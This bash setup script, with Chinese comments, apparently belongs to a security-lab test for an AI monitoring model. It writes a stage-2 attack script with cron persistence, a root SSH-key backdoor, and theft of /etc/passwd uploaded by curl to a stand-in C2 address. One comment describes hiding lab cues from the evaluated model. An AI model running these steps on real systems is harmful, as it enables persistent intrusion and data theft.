#!/usr/bin/env bash
# prepare（窗口外）：编译链载荷 + 下载源/外传接收端 + 监听端。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"

# 编译窗口外完成：r11 复核整改——窗口内的 gcc/ld 编译链会让模型正确判定
# "载荷系本机制作"，指向受控环境而非入侵
bash "$HERE/common/build.sh" stage1.elf

# 双角色接收端：GET 当下载源（首段 ingress），POST 当外传目的地（末段，写回执）
mkdir -p /tmp/.seclab-recv-chain
cp stage1.elf /tmp/.seclab-recv-chain/drop.elf
bash "$HERE/common/post_receiver.sh" 18083 /tmp/.seclab-recv-chain
bash "$HERE/common/start_listener.sh" 8443 40 2

mkdir -p /tmp/.sysupd
cat > watch_paths.txt <<W
/tmp/.sysupd
W
: > approved_endpoints.txt
cat > system_paths.txt <<S
/tmp/.sysupd/stage1.elf
/root/.ssh/authorized_keys
S
# 攻击者第二阶段脚本（将由 stage1.elf 派生执行——归因关键）
cat > chain_stage2.sh <<'EOS'
#!/usr/bin/env bash
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
# 持久化 1：cron 驻留
printf '*/5 * * * * root /tmp/.sysupd/stage1.elf %s 8443 500\n' "$C2_IP" > /etc/cron.d/sysupd-maint
# 持久化 2：SSH 公钥驻留 + 登入尝试
ssh-keygen -q -t ed25519 -N "" -f /tmp/.sysupd/chain_ed25519 -C maint-deploy
cat /tmp/.sysupd/chain_ed25519.pub >> /root/.ssh/authorized_keys
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /tmp/.sysupd/chain_ed25519 root@127.0.0.1 true 2>/dev/null || true
# 敏感文件收集与外传（回执为成功物证）
mkdir -p /tmp/.sysupd/loot && cp /etc/hostname /etc/passwd /tmp/.sysupd/loot/ 2>/dev/null || true
tar czf /tmp/.sysupd/loot.tar.gz -C /tmp/.sysupd loot
curl -s --max-time 10 -F f=@/tmp/.sysupd/loot.tar.gz "http://$C2_IP:18083/exfil" > /tmp/.sysupd/upload-receipt.txt
EOS
chmod 700 chain_stage2.sh
